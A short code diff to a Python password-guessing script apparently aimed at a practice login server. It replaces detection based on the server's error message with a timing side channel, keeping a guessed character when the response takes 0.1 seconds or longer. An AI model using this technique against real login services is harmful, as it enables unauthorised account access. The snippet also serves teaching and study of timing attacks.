@@ -3,6 +3,7 @@ import sys
 import os
 import string
 import json
+import time
 
 
 def login_generator():
@@ -40,8 +41,11 @@ def main():
                     "password": password + char
                 })
                 conn.send(message.encode())
+                start = time.perf_counter()
                 response = conn.recv(1024)
-                if json.loads(response.decode())['result'] == "Exception happened during login":
+                end = time.perf_counter()
+                difference = end - start
+                if difference >= 0.1:
                     password += char
                     break
                 elif json.loads(response.decode())['result'] == "Connection success!":
